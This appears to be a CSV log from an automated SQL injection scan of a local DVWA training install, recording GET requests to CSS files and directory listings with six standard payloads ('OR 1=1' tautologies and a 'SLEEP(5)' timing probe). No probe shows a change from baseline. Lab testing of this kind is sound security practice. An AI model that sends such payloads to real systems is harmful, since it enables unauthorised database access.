page_url,param_tested,method,payload,status,elapsed,length,evidence,baseline_length,baseline_elapsed
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR '1'='1,200,0.006545,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR '1'='1' -- ,200,0.004506,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR 1=1--,200,0.003533,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,""" OR """" = """,200,0.004584,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,' OR SLEEP(5) --,200,0.00523,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=M;O=A,id,GET,1' OR '1'='1,200,0.004445,1529,,1529,0.004237
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR '1'='1,200,0.004237,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR '1'='1' -- ,200,0.006259,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR 1=1--,200,0.004851,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,""" OR """" = """,200,0.005138,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,' OR SLEEP(5) --,200,0.003489,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=N;O=D,id,GET,1' OR '1'='1,200,0.004721,1529,,1529,0.004637
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR '1'='1,200,0.004046,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR '1'='1' -- ,200,0.00514,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR 1=1--,200,0.004555,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,""" OR """" = """,200,0.00484,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,' OR SLEEP(5) --,200,0.007823,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/?C=D;O=A,id,GET,1' OR '1'='1,200,0.005249,1529,,1529,0.004025
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR '1'='1,200,0.003292,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR '1'='1' -- ,200,0.004069,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR 1=1--,200,0.003805,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,""" OR """" = """,200,0.00353,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,' OR SLEEP(5) --,200,0.003763,842,,842,0.003606
http://127.0.0.1/dvwa/css/login.css,id,GET,1' OR '1'='1,200,0.003893,842,,842,0.003606
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR '1'='1,200,0.003828,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR '1'='1' -- ,200,0.005441,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR 1=1--,200,0.004041,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,""" OR """" = """,200,0.005803,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,' OR SLEEP(5) --,200,0.004424,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/main.css,id,GET,1' OR '1'='1,200,0.006318,4026,,4026,0.004653
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR '1'='1,200,0.00407,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR '1'='1' -- ,200,0.005223,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR 1=1--,200,0.003946,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,""" OR """" = """,200,0.00504,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,' OR SLEEP(5) --,200,0.004296,304,,304,0.004574
http://127.0.0.1/dvwa/css/help.css,id,GET,1' OR '1'='1,200,0.004802,304,,304,0.004574
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR '1'='1,200,0.004243,240,,240,0.005577
http://127.0.0.1/dvwa/css/source.css,id,GET,' OR '1'='1' -- ,200,0.004087,240,,240,0.005577
